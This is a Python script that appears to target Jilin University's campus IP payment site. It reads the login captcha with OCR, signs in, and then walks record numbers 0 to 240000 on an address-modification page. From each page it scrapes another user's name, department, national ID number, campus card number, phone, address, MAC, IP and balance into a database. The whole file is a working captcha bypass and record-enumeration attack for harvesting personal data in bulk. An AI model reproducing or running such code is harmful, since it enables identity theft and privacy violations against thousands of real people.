# -*- coding: utf-8 -*-
import pytesseract
from PIL import Image
import requests
from bs4 import BeautifulSoup
import os,sys
import rethinkdb as rethink

pic_url = 'https://ip.jlu.edu.cn/pay/img_safecode.php'
login_url = 'https://ip.jlu.edu.cn/pay/index.php'
menu = 'chklogin'
card = ''    #your campus card number
pwd = ''    #password

def crawl():
    s = requests.Session()
    r = s.get(pic_url,timeout=10)
    with open('vcode.png', 'wb') as pic:
        pic.write(r.content)
    im = pytesseract.image_to_string(Image.open('vcode.png'))
    im = im.replace(' ', '')
	
    data = {'menu':menu, 'card':card, 'pwd':pwd, 'imgcode':im}
    res = s.post(login_url,data)
    conn = rethink.connect(host = 'localhost',port = 28015,db = 'jlu')
    

    for i in range(0, 240000):
        person = {}
        res = s.get('https://ip.jlu.edu.cn/pay/modify_addr.php?menu=set_ip&num=%s' % i)
        res.encoding = 'gbk'
        soup = BeautifulSoup(res.text)
        try:
            name_base = soup.find(text="姓名")
            name_td_tag = name_base.findNext('td')
            person['name'] = name_td_tag.contents[0].strip()
            #print person['job'].encode('utf-8')

            department_base = soup.find(text="所在班级或单位")
            department_tag_name = department_base.findNext('td')
            person['department'] = department_tag_name.contents[0].strip()
            #print person['department'].encode('utf-8')

            idcard_base = soup.find(text='身份证号码')
            idcard_tag_name = idcard_base.findNext('td')
            person['idcard'] = idcard_tag_name.contents[0].strip()
            #print person['idcard'].encode('utf-8')

            campuscard_base = soup.find(text='校园卡号码')
            campuscard_tag_name = campuscard_base.findNext('td')
            person['campuscard'] = campuscard_tag_name.contents[0].strip()
            #print person['campuscard'].encode('utf-8')

            phone_base = soup.find(text='原联系电话')
            phone_tag_name = phone_base.findNext('td')
            person['phone'] = phone_tag_name.contents[0].strip()
            #print person['phone'].encode('utf-8')

            addr_base = soup.find(text='原入网区域')
            addr_tag_name = addr_base.findNext('td')
            person['addr'] = addr_tag_name.contents[0].strip()
            #print person['addr'].encode('utf-8')

            address_base = soup.find(text='原详细地址')
            address_tag_name = address_base.findNext('td')
            person['address'] = address_tag_name.contents[0].strip()
            #print person['address'].encode('utf-8')

            mac_base = soup.find(text='网卡物理地址')
            mac_tag_name = mac_base.findNext('p')
            person['mac'] = mac_tag_name.contents[0].strip()
            #print person['mac'].encode('utf-8')

            ip_base = soup.find(text='原IP地址')
            ip_tag_name = ip_base.findNext('td')
            person['ip'] = ip_tag_name.contents[0].strip()
            #print person['ip'].encode('utf-8')

            money_base = soup.find(text='帐户余额')
            money_tag_name = money_base.findNext('td')
            person['money'] = money_tag_name.contents[0].strip()
            #print person['money'].encode('utf-8')

            for name in soup.select('input[name="num"]'):
                person['num'] = name.get('value').strip()
                #print person['num'].encode('utf-8')
        except:
            continue
        rethink.table("ip").insert(person).run(conn)
crawl()
